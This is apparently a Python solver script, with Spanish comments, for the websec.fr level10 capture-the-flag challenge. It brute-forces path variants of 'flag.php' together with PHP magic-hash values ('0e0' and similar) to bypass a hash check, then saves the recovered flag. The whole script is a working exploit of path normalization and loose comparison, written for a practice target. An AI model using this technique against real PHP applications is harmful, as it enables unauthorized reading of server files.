#!/usr/bin/env python3
import requests
import time

url = "https://websec.fr/level10/index.php"

print("Probando paths con múltiples slashes...")
print("="*60 + "\n")

# Probar con diferentes cantidades de slashes y dots
tested = 0

# Estrategia: ./ repetido, /// repetido, etc
for num in range(1, 200):
    paths_to_test = [
        "/" * num + "flag.php",
        "." + "/" * num + "flag.php",
        "./" * num + "flag.php",
        "." * num + "/flag.php",
    ]
    
    for path in paths_to_test:
        # Probar con hash "0e0" y variantes
        for hash_val in ["0e0", "0", "0e00", "0e000", "0e1", "0e12345"]:
            try:
                r = requests.get(url, params={"f": path, "hash": hash_val}, timeout=2)
                
                if "WEBSEC{" in r.text:
                    flag_start = r.text.find("WEBSEC{")
                    flag_end = r.text.find("}", flag_start)
                    if flag_end > flag_start:
                        flag = r.text[flag_start:flag_end+1]
                        print(f"\n{'='*60}")
                        print(f"¡¡¡FLAG!!!!")
                        print(f"{'='*60}")
                        print(f"FLAG: {flag}")
                        print(f"Path: {path}")
                        print(f"Hash: {hash_val}")
                        
                        with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                            f.write(f"FLAG: {flag}\nPath: {path}\nHash: {hash_val}\n")
                        
                        exit(0)
                
                tested += 1
                if tested % 100 == 0:
                    print(f"Probados: {tested} - Último: {path[:30]}...")
            
            except:
                continue
            
            if tested % 20 == 0:
                time.sleep(0.01)

print(f"\nTotal probados: {tested}")